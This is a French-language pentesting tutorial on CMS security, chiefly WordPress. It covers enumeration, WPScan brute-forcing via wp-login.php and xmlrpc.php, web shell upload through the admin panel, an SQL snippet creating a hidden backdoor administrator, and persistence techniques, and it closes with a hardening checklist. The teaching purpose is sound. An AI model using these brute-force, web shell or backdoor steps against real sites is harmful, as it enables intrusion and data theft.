# CMS Security Testing

## Systèmes de Gestion de Contenu (CMS)

Un Système de Gestion de Contenu (CMS) est une application ou une plateforme logicielle qui permet aux utilisateurs de créer, gérer et publier du contenu numérique sur le web. Les CMS simplifient le processus de création et de maintenance de sites web en fournissant une interface conviviale pour la création, l'édition et l'organisation du contenu.

Les CMS jouent un rôle crucial dans les tests de sécurité des applications web car ils sont couramment ciblés par des attaquants en raison de leur utilisation généralisée. Comprendre les CMS dans le contexte des tests de sécurité est essentiel pour identifier et atténuer efficacement les vulnérabilités.

Les plateformes CMS populaires incluent :

- **WordPress** (propulse plus de 40% de tous les sites web sur internet).
- **Drupal** (couramment utilisé par les gouvernements et les grandes organisations).
- **Joomla** (utilisé pour les portails et les sites d'entreprise).
- **Magento** (axé sur le commerce électronique).
- **Ghost** (plateforme de blogging).

---

## Pourquoi Cibler les CMS

Les CMS sont partie intégrante des applications web et des sites web, ce qui en fait une cible de choix pour les tests de sécurité pour plusieurs raisons :

- **Ubiquité** : Les CMS comme WordPress, Drupal et Joomla propulsent une part importante des sites web sur internet. Leur utilisation généralisée en fait des cibles attractives pour les attaquants.
- **Complexité** : Les CMS sont riches en fonctionnalités, offrant divers plugins, thèmes et options de personnalisation. Cette complexité peut introduire des vulnérabilités de sécurité.
- **Mises à Jour Régulières** : Les CMS publient fréquemment des mises à jour et des correctifs de sécurité pour corriger les vulnérabilités. Les tests garantissent que ces mises à jour sont appliquées correctement.
- **Données Utilisateur** : Les CMS gèrent souvent des données utilisateur sensibles, ce qui rend la sécurité cruciale pour se protéger contre les violations de données.

---

## Préoccupations de Sécurité Courantes avec les CMS

- **Vulnérabilités** : Les CMS peuvent présenter des vulnérabilités telles que l'injection SQL, le Cross-Site Scripting (XSS), le Cross-Site Request Forgery (CSRF), et plus encore, qui doivent être identifiées et corrigées.
- **Authentification et Autorisation** : Les tests doivent vérifier que les mécanismes d'authentification et d'autorisation des utilisateurs sont robustes et que les rôles et permissions des utilisateurs sont correctement appliqués.
- **Problèmes de Configuration** : Les erreurs de configuration, les identifiants par défaut et les paramètres trop permissifs peuvent entraîner des vulnérabilités de sécurité.
- **Sécurité des Plugins et Thèmes** : Les CMS permettent l'installation de plugins et de thèmes, qui peuvent introduire des vulnérabilités s'ils ne sont pas développés et maintenus de manière sécurisée.

---

# Méthodologie de Tests de Sécurité CMS

Une approche structurée des tests de sécurité CMS suit ces phases :

## 1. Collecte d'Informations et Énumération

- Identifier le CMS et sa version.
- Identifier les utilisateurs, plugins et thèmes.
- Effectuer l'énumération des répertoires et fichiers.

## 2. Scan de Vulnérabilités

- Tester les erreurs de configuration et les vulnérabilités courantes.
- Effectuer un scan et une analyse de vulnérabilités pour identifier les vulnérabilités potentielles ou les erreurs de configuration dans les plugins et thèmes.

## 3. Tests d'Authentification

- Effectuer l'énumération des noms d'utilisateur et des attaques par force brute sur les pages de connexion.
- Évaluer la gestion des sessions pour détecter des faiblesses et des vulnérabilités potentielles de fixation de session.

## 4. Exploitation

- Identifier et exploiter les vulnérabilités connues dans le noyau du CMS.
- Identifier et exploiter les vulnérabilités dans les plugins, extensions et thèmes.

## 5. Post-Exploitation

- Identifier les moyens de maintenir l'accès au CMS après exploitation sous forme de backdoor ou de web shell.
- Tenter d'extraire des données du CMS ou du serveur sous-jacent.

---

# Outils d'Identification de CMS

Avant de tester un CMS, vous devez identifier quel CMS la cible utilise et énumérer ses composants.

## Outils Courants d'Identification de CMS

| Outil | Description |
|---|---|
| `Wappalyzer` | Extension de navigateur et outil CLI qui identifie les technologies y compris les CMS |
| `WhatWeb` | Outil CLI qui identifie les CMS, frameworks et technologies web |
| `WPScan` | Scanner de vulnérabilités WordPress spécialisé |
| `CMSeek` | Boîte à outils de détection et d'exploitation de CMS |
| `droopescan` | Scanner de CMS basé sur des plugins pour Drupal, WordPress, SilverStripe, etc. |
| `Joomscan` | Scanner de vulnérabilités Joomla |
| `cmsmap` | Scanner de CMS prenant en charge WordPress, Joomla et Drupal |

### Exemple : WhatWeb

```bash
whatweb https://target.local  # identifie le CMS et autres technologies web.
```

### Exemple : CMSeek

```bash
cmseek -u https://target.local  # détecte le CMS et effectue une énumération basique.
```

---

# Introduction à WordPress

## Qu'est-ce que WordPress

WordPress est l'un des Systèmes de Gestion de Contenu (CMS) les plus populaires et les plus utilisés pour construire des sites web et des applications web. C'est un CMS open source, ce qui signifie que son code source est disponible pour examen et modification par la communauté.

WordPress est hautement modulaire, permettant aux utilisateurs d'étendre ses fonctionnalités via des plugins et des thèmes. Il fournit une interface utilisateur intuitive pour la gestion de contenu, le rendant accessible aux utilisateurs non techniques.

Dans le contexte des tests de sécurité des applications web, comprendre WordPress est crucial, car il est une cible fréquente pour les attaquants.

## Architecture de WordPress

WordPress est construit principalement en PHP et utilise une base de données MySQL ou MariaDB. Comprendre son architecture est essentiel pour des tests de sécurité efficaces.

### Structure des Répertoires du Noyau

Une installation WordPress typique a la structure suivante :

```text
/var/www/html/wordpress/
├── wp-admin/             # Fichiers du tableau de bord d'administration
│   ├── login.php         # Page de connexion
│   ├── admin.php         # Point d'entrée du panneau d'administration
│   └── ...
├── wp-includes/          # Fonctions et bibliothèques du noyau WordPress
│   ├── wp-db.php         # Couche d'abstraction de base de données
│   ├── pluggable.php     # Fonctions d'authentification
│   └── ...
├── wp-content/           # Contenu téléchargé par l'utilisateur et personnalisé
│   ├── plugins/          # Plugins installés (chacun dans son propre sous-répertoire)
│   ├── themes/           # Thèmes installés (chacun dans son propre sous-répertoire)
│   ├── uploads/          # Fichiers téléchargés par l'utilisateur (images, documents, etc.)
│   └── ...
├── wp-config.php         # Fichier de configuration principal (identifiants BD, clés)
├── wp-login.php          # Page de connexion
├── wp-signup.php         # Page d'inscription (multisite)
├── xmlrpc.php            # Interface XML-RPC (pingbacks, publication à distance)
├── wp-load.php           # Fichier bootstrap qui charge WordPress
├── index.php              # Contrôleur frontal
├── .htaccess              # Configuration Apache (permaliens, redirections)
└── wp-json/               # Endpoint de l'API REST (/wp-json/wp/v2/)
```

### Fichiers Clés pour les Tests de Sécurité

| Fichier / Chemin | Importance |
|---|---|
| `wp-config.php` | Contient les identifiants de base de données, les clés d'authentification et les sels. S'il est lisible, il révèle les détails de connexion à la base de données |
| `wp-login.php` | Page de connexion — cible pour la force brute et le credential stuffing |
| `wp-admin/` | Tableau de bord d'administration — l'accès nécessite une authentification |
| `wp-content/uploads/` | Fichiers téléchargés par l'utilisateur — emplacement potentiel pour les web shells |
| `wp-content/plugins/` | Plugins installés — chaque plugin peut introduire des vulnérabilités |
| `wp-content/themes/` | Thèmes installés — les thèmes peuvent contenir des vulnérabilités |
| `xmlrpc.php` | Interface XML-RPC — peut être utilisée pour l'amplification de force brute et le DDoS par pingback |
| `wp-json/` | API REST — peut exposer des données utilisateur et des endpoints |
| `readme.html` | Fichier par défaut qui révèle la version de WordPress |
| `wp-content/debug.log` | Fichier de log de débogage — peut contenir des informations sensibles si le mode debug est activé |
| `wp-trackback.php` | Fonctionnalité de trackback — peut être abusée pour le DDoS |

### Structure de la Base de Données WordPress

WordPress utilise une base de données MySQL ou MariaDB avec les tables principales suivantes :

| Table | Contenu |
|---|---|
| `wp_users` | Comptes utilisateurs (noms d'utilisateur, adresses e-mail, hachages de mots de passe) |
| `wp_usermeta` | Métadonnées utilisateur (rôles, capacités) |
| `wp_posts` | Articles, pages et types de contenu personnalisés |
| `wp_options` | Configuration du site, paramètres des plugins, thèmes actifs |
| `wp_terms` | Catégories et étiquettes |
| `wp_comments` | Commentaires et leurs métadonnées |

La table `wp_users` stocke les hachages de mots de passe en utilisant `phpass` (hachage portable basé sur MD5) par défaut. Dans les versions plus récentes, bcrypt ou Argon2 peuvent être utilisés selon la configuration de PHP.

## Rôles Utilisateur de WordPress

WordPress implémente un système de contrôle d'accès basé sur les rôles :

| Rôle | Capacités |
|---|---|
| **Super Admin** | Accès complet à tout le réseau (multisite uniquement) |
| **Administrator** | Accès complet à un seul site, y compris les plugins et thèmes |
| **Editor** | Peut publier et gérer des articles, y compris ceux d'autres utilisateurs |
| **Author** | Peut publier et gérer ses propres articles |
| **Contributor** | Peut écrire et gérer ses propres articles mais ne peut pas les publier |
| **Subscriber** | Peut uniquement lire les articles et gérer son profil |

D'un point de vue sécurité, le rôle **Administrator** est la cible principale — obtenir un accès administrateur signifie un contrôle total sur le site WordPress, y compris la capacité de télécharger des plugins (et donc des web shells).

---

## Pertinence de Sécurité de WordPress

- **Hautement Ciblé** : En raison de sa prévalence, WordPress est une cible de choix pour les attaquants cherchant à exploiter des vulnérabilités.
- **Écosystème de Plugins** : Le grand nombre de plugins et de thèmes tiers augmente la surface d'attaque et introduit des risques de sécurité potentiels.
- **Mises à Jour Fréquentes** : WordPress publie régulièrement des mises à jour et des correctifs de sécurité pour corriger les vulnérabilités connues.

---

## Vulnérabilités Courantes de WordPress

### Plugins et Thèmes Vulnérables

Les plugins et thèmes contiennent souvent des vulnérabilités qui peuvent être exploitées. L'écosystème de WordPress reposant largement sur des développeurs tiers, la qualité et la sécurité des plugins varient considérablement. De nombreux plugins sont abandonnés, obsolètes ou n'ont jamais fait l'objet d'un audit de sécurité.

Les vulnérabilités courantes des plugins/thèmes incluent :

- Injection SQL via des paramètres d'entrée non assainis.
- XSS via une entrée reflétée ou stockée dans les pages de plugins.
- Téléchargement arbitraire de fichiers via des formulaires de téléchargement mal validés.
- Inclusion de Fichiers Locaux (LFI) via des paramètres de chemin non assainis.
- Exécution de Code à Distance (RCE) via des appels `eval()`, `system()` ou `exec()` non sécurisés.
- SSRF via des plugins qui récupèrent des URLs distantes.

### Attaques par Force Brute

Les attaquants peuvent tenter de deviner les identifiants de connexion via des attaques par force brute contre `wp-login.php` ou `xmlrpc.php`.

WordPress n'implémente pas de verrouillage de compte par défaut, ce qui le rend vulnérable aux attaques par force brute à moins que des plugins de sécurité supplémentaires ne soient installés.

### Injection SQL

Les sites WordPress peuvent être vulnérables aux attaques par injection SQL si la validation des entrées est inadéquate. Cela peut se produire dans :

- Le noyau de WordPress (rare dans les versions récentes, mais des vulnérabilités historiques existent).
- Les plugins et thèmes qui construisent des requêtes SQL sans assainissement approprié.
- Le code personnalisé ajouté par les développeurs du site.

### Cross-Site Scripting (XSS)

Les vulnérabilités XSS peuvent être introduites via :

- Des plugins qui affichent les entrées utilisateur sans échappement approprié.
- Des thèmes qui ne assainissent pas le contenu des articles ou des commentaires.
- Du code personnalisé utilisant des fonctions WordPress non sécurisées.

### Cross-Site Request Forgery (CSRF)

Les attaques CSRF peuvent compromettre la sécurité d'un site WordPress si les mécanismes d'autorisation sont faibles. Le noyau de WordPress utilise des nonces (jetons cryptographiques) pour se protéger contre le CSRF, mais les plugins peuvent ne pas les implémenter correctement.

### Configuration Non Sécurisée

Les erreurs de configuration, les mots de passe faibles et les paramètres trop permissifs peuvent entraîner des problèmes de sécurité :

- Préfixe de table de base de données par défaut (`wp_`) — facilite l'injection SQL automatisée.
- Mode debug activé en production (`WP_DEBUG` défini sur `true` dans `wp-config.php`).
- Édition de fichiers autorisée dans le tableau de bord d'administration (`DISALLOW_FILE_EDIT` non défini).
- Mots de passe administrateur faibles.
- Inscription d'utilisateur sans restriction (`anyone can register` activé avec le rôle par défaut défini sur Subscriber ou Contributor).
- Listage de répertoires activé sur le serveur web.
- `wp-config.php` avec des permissions de lecture pour tous.
- Accès non restreint à `xmlrpc.php`.
- Fichiers `readme.html` et de licence par défaut présents.

---

# Méthodologie de Pentesting WordPress

## 1. Collecte d'Informations et Énumération

### Scan de Ports et Énumération de Services

```bash
nmap -sV -sC target.local  # scanne les ports ouverts et identifie les services (serveur web, base de données, etc.).
```

```bash
nmap -p 80,443,3306,8080 --script=http-enum target.local  # énumère les chemins web courants et identifie WordPress.
```

### Identifier la Version de WordPress

La version de WordPress peut être identifiée par plusieurs méthodes :

**Vérifier la balise meta generator :**

```bash
curl -s http://target.local | grep -i generator  # extrait la version de WordPress de la balise meta HTML.
```

**Vérifier readme.html :**

```bash
curl -s http://target.local/readme.html | grep -i version  # extrait la version du fichier readme par défaut.
```

**Vérifier le flux :**

```bash
curl -s http://target.local/feed/ | grep -i generator  # extrait la version du flux RSS.
```

### Énumérer les Thèmes et Plugins

**Vérifier le code source HTML pour les chemins de thèmes et plugins :**

```bash
curl -s http://target.local | grep -oP 'wp-content/(themes|plugins)/[^/]+' | sort -u  # extrait les noms de répertoires de thèmes et plugins du code source de la page.
```

**Énumérer les plugins avec Gobuster :**

```bash
gobuster dir -u http://target.local/wp-content/plugins/ -w /usr/share/wordlists/dirb/common.txt -s 200,301,403  # force brute des répertoires de plugins.
```

**Énumérer les thèmes avec Gobuster :**

```bash
gobuster dir -u http://target.local/wp-content/themes/ -w /usr/share/wordlists/dirb/common.txt -s 200,301,403  # force brute des répertoires de thèmes.
```

### Énumération des Fichiers et Répertoires

```bash
gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old -t 30 -o wp-enum.txt  # énumère les fichiers et répertoires.
```

Chemins clés à vérifier :

```text
/wp-admin/
/wp-login.php
/wp-config.php
/wp-content/uploads/
/wp-content/plugins/
/wp-content/themes/
/xmlrpc.php
/wp-json/
/readme.html
/wp-content/debug.log
/wp-content/backups/
/wp-content/upgrade/
```

---

## 2. Scan de Vulnérabilités avec WPScan

**WPScan** est l'outil principal pour les tests de sécurité WordPress. C'est un scanner de vulnérabilités WordPress gratuit et open source qui peut énumérer les plugins, thèmes, utilisateurs et identifier les vulnérabilités connues.

### Installation

WPScan est préinstallé sur Kali Linux. Pour le mettre à jour :

```bash
wpscan --update  # met à jour la base de données et l'outil WPScan.
```

### Scan de Base

```bash
wpscan --url http://target.local  # effectue un scan de base de WordPress.
```

### Énumération Agressive des Plugins

```bash
wpscan --url http://target.local --enumerate ap  # énumère agressivement tous les plugins.
```

### Énumérer les Plugins Vulnérables

```bash
wpscan --url http://target.local --enumerate vp  # énumère les plugins vulnérables connus.
```

### Énumérer les Thèmes

```bash
wpscan --url http://target.local --enumerate t  # énumère les thèmes installés.
```

### Énumérer les Thèmes Vulnérables

```bash
wpscan --url http://target.local --enumerate vt  # énumère les thèmes vulnérables connus.
```

### Énumérer les Utilisateurs

```bash
wpscan --url http://target.local --enumerate u  # énumère les utilisateurs WordPress.
```

### Énumération Complète

```bash
wpscan --url http://target.local --enumerate ap at u --random-user-agent -o wpscan-results.txt  # énumération complète avec user agents aléatoires, enregistre les résultats.
```

### Codes d'Énumération WPScan

| Code | Ce Qu'il Énumère |
|---|---|
| `u` | Utilisateurs |
| `p` | Plugins populaires |
| `ap` | Tous les plugins (agressif, plus lent) |
| `vp` | Plugins vulnérables |
| `t` | Thèmes populaires |
| `at` | Tous les thèmes (agressif, plus lent) |
| `vt` | Thèmes vulnérables |
| `cb` | Sauvegardes de configuration |
| `dbe` | Exportations de base de données |
| `tt` | Timthumbs |

### Scan avec API Token

WPScan peut vérifier les plugins et thèmes contre sa base de données de vulnérabilités en utilisant un API token. Un API token gratuit est disponible en s'inscrivant sur le site web de WPScan.

```bash
wpscan --url http://target.local --api-token YOUR_API_TOKEN --enumerate vp,vt  # vérifie les vulnérabilités connues en utilisant l'API.
```

---

## 3. Tests d'Authentification

### Énumération des Noms d'Utilisateur

L'énumération des utilisateurs WordPress peut être effectuée via :

**WPScan :**

```bash
wpscan --url http://target.local --enumerate u  # énumère les utilisateurs via l'API REST et les archives d'auteur.
```

**API REST :**

```bash
curl -s http://target.local/wp-json/wp/v2/users | jq  # récupère les informations utilisateur via l'API REST de WordPress.
```

**Archives d'Auteur :**

```bash
curl -s -I http://target.local/?author=1  # vérifie les IDs utilisateur via les redirections d'archives d'auteur.
curl -s -I http://target.local/?author=2  # vérifie l'ID utilisateur suivant.
```

### Force Brute de Connexion avec WPScan

```bash
wpscan --url http://target.local -U admin -P /usr/share/wordlists/rockyou.txt --max-threads 50  # force brute du mot de passe admin.
```

```bash
wpscan --url http://target.local -U users.txt -P /usr/share/wordlists/rockyou.txt -o wp-brute.txt  # force brute de plusieurs utilisateurs avec une liste de mots de passe.
```

### Force Brute via xmlrpc.php

L'endpoint `xmlrpc.php` peut être utilisé pour des attaques par force brute car il permet plusieurs tentatives de mot de passe dans une seule requête HTTP (via la méthode `system.multicall`), ce qui peut contourner la limitation de débit sur `wp-login.php`.

```bash
wpscan --url http://target.local -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc-multicall  # force brute via xmlrpc.php multicall.
```

---

## 4. Exploitation

### Exploiter les Vulnérabilités Connues

Une fois un plugin, un thème ou une version de WordPress vulnérable identifié, recherchez des exploits disponibles publiquement :

```bash
searchsploit wordpress plugin <plugin-name>  # recherche des exploits connus dans exploitdb.
```

```bash
msfconsole -q -x "search wordpress; exit"  # recherche des modules WordPress dans Metasploit.
```

### Voies d'Exploitation Courantes de WordPress

| Vecteur d'Attaque | Description |
|---|---|
| RCE dans un plugin vulnérable | Exploiter une vulnérabilité RCE connue dans un plugin obsolète |
| Téléchargement arbitraire de fichiers | Abuser de la fonctionnalité de téléchargement d'un plugin pour télécharger un web shell |
| Injection SQL dans un plugin | Extraire des données de la base de données via des entrées de plugin non assainies |
| XSS dans un thème | Injecter du JavaScript malveillant via des vulnérabilités de thème |
| Amplification via xmlrpc.php | Utiliser multicall pour l'amplification de force brute ou le DDoS par pingback |
| Énumération d'utilisateurs via l'API REST | Extraire les noms d'utilisateur via `/wp-json/wp/v2/users` |
| Divulgation de wp-config.php | Lire le fichier de configuration pour obtenir les identifiants de base de données |
| Lecture arbitraire de fichiers | Exploiter LFI ou path traversal dans les plugins pour lire des fichiers sensibles |

### Télécharger un Web Shell via le Panneau d'Administration

Une fois l'accès administrateur obtenu, un web shell peut être téléchargé via l'éditeur de plugins ou en installant un plugin malveillant :

**Méthode 1 : Téléchargement de Plugin**

1. Accéder à `wp-admin/plugin-install.php`.
2. Télécharger un ZIP de plugin malveillant contenant un web shell PHP.
3. Activer le plugin.
4. Accéder au web shell à `wp-content/plugins/malicious-plugin/shell.php`.

**Méthode 2 : Éditeur de Thèmes**

Si l'édition de fichiers n'est pas désactivée (`DISALLOW_FILE_EDIT` non défini dans `wp-config.php`) :

1. Accéder à `wp-admin/theme-editor.php`.
2. Éditer un fichier du thème (ex. `404.php`) et injecter du code PHP.
3. Accéder au fichier modifié (ex. `http://target.local/wp-content/themes/twentytwentyfour/404.php`).

**Méthode 3 : Téléchargement de Médias**

1. Accéder à `wp-admin/media-new.php`.
2. Télécharger un fichier PHP déguisé en image (peut nécessiter de contourner les restrictions de téléchargement).
3. Accéder au fichier téléchargé dans `wp-content/uploads/YYYY/MM/`.

---

## 5. Post-Exploitation

### Maintenir l'Accès

Après avoir obtenu l'accès à un site WordPress, la persistance peut être maintenue via :

- **Web shells** : Télécharger un web shell PHP dans `wp-content/uploads/`, un répertoire de thèmes ou de plugins.
- **Plugins backdoor** : Créer un plugin personnalisé contenant un backdoor caché.
- **Fichiers de thème modifiés** : Injecter du code backdoor dans un fichier de thème existant (ex. `functions.php`).
- **Nouvel utilisateur admin** : Créer un nouveau compte administrateur moins susceptible d'être remarqué.
- **`wp-config.php` modifié** : Injecter du code PHP dans le fichier de configuration.

### Créer un Nouvel Utilisateur Admin via la Base de Données

Si l'accès à la base de données est obtenu :

```sql
INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
VALUES ('backdoor', MD5('password123'), 'backdoor', 'backdoor@example.com', NOW(), 0, 'backdoor');

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_user_level', '10');
```

### Exfiltration de Données

Données sensibles pouvant être extraites d'un site WordPress compromis :

- Identifiants utilisateur de `wp_users` (hachages de mots de passe).
- Adresses e-mail et données personnelles.
- Données de configuration des plugins et thèmes.
- Identifiants de base de données de `wp-config.php`.
- Fichiers et documents téléchargés depuis `wp-content/uploads/`.
- Clés d'API et secrets stockés dans les paramètres des plugins (dans `wp_options`).

---

# Autres Outils de Tests CMS

Bien que WordPress soit le CMS le plus couramment testé, des outils et méthodologies similaires existent pour d'autres CMS :

## Drupal

```bash
droopescan scan drupal -u http://target.local  # scanne un site Drupal pour les vulnérabilités et la version.
```

```bash
cmsmap http://target.local  # scanne des sites CMS y compris Drupal.
```

Chemins clés de Drupal à énumérer :

```text
/user/login
/admin
/modules/
/themes/
/sites/default/settings.php  # équivalent de wp-config.php
/CHANGELOG.txt               # révèle la version de Drupal
```

## Joomla

```bash
joomscan -u http://target.local  # scanne un site Joomla pour les vulnérabilités.
```

```bash
cmsmap http://target.local  # prend également en charge le scan de Joomla.
```

Chemins clés de Joomla à énumérer :

```text
/administrator/
/components/
/modules/
/plugins/
/configuration.php  # équivalent de wp-config.php
/README.txt         # peut révéler la version de Joomla
```

---

# Liste de Renforcement de WordPress

Recommandations de sécurité courantes pour WordPress :

- Maintenir le noyau WordPress, les plugins et les thèmes à jour.
- Utiliser des mots de passe forts et uniques pour tous les comptes administrateur.
- Limiter les tentatives de connexion (via des plugins ou des règles côté serveur).
- Désactiver l'édition de fichiers dans le tableau de bord d'administration (`DISALLOW_FILE_EDIT` défini sur `true` dans `wp-config.php`).
- Désactiver ou restreindre `xmlrpc.php` si inutile.
- Changer le préfixe de table de base de données par défaut de `wp_`.
- Déplacer `wp-config.php` d'un répertoire au-dessus de la racine web si possible.
- Désactiver le listage de répertoires sur le serveur web.
- Supprimer les fichiers par défaut (`readme.html`, `license.txt`).
- Restreindre l'accès à `wp-admin` par IP si possible.
- Désactiver l'inscription des utilisateurs si inutile.
- Définir les permissions de fichiers correctes (fichiers : `644`, répertoires : `755`, `wp-config.php` : `600`).
- Utiliser HTTPS pour toutes les connexions.
- Installer un WAF ou un plugin de sécurité.
- Sauvegarder régulièrement le site et la base de données.
- Supprimer les plugins et thèmes inutilisés.
- Activer la journalisation de débogage vers un fichier uniquement, pas à l'écran (`WP_DEBUG_DISPLAY` défini sur `false`).

---

# Points Clés

- Les CMS sont des cibles principales pour les tests de sécurité en raison de leur ubiquité et de leur complexité.
- La méthodologie de pentesting CMS suit : collecte d'informations, scan de vulnérabilités, tests d'authentification, exploitation et post-exploitation.
- WordPress est le CMS le plus utilisé et le plus fréquemment ciblé.
- L'architecture de WordPress comprend les répertoires du noyau (`wp-admin`, `wp-includes`, `wp-content`) et les fichiers clés (`wp-config.php`, `wp-login.php`, `xmlrpc.php`).
- Les rôles utilisateur de WordPress déterminent les niveaux d'accès (Administrator, Editor, Author, Contributor, Subscriber).
- Les vulnérabilités courantes de WordPress incluent les plugins/thèmes vulnérables, les attaques par force brute, l'injection SQL, le XSS, le CSRF et les configurations non sécurisées.
- WPScan est l'outil principal pour l'énumération et le scan de vulnérabilités WordPress.
- L'énumération des utilisateurs peut être effectuée via l'API REST, les archives d'auteur ou WPScan.
- xmlrpc.php peut être utilisé pour l'amplification de force brute via multicall.
- L'accès administrateur permet de télécharger des web shells via les plugins, l'éditeur de thèmes ou les téléchargements de médias.
- La post-exploitation comprend le maintien de l'accès via des web shells, des plugins backdoor ou la création de nouveaux utilisateurs admin.
- D'autres CMS (Drupal, Joomla) ont des approches de test similaires avec des outils et des chemins spécifiques à la plateforme.
- Validez toujours les résultats manuellement avant de les signaler comme des vulnérabilités.
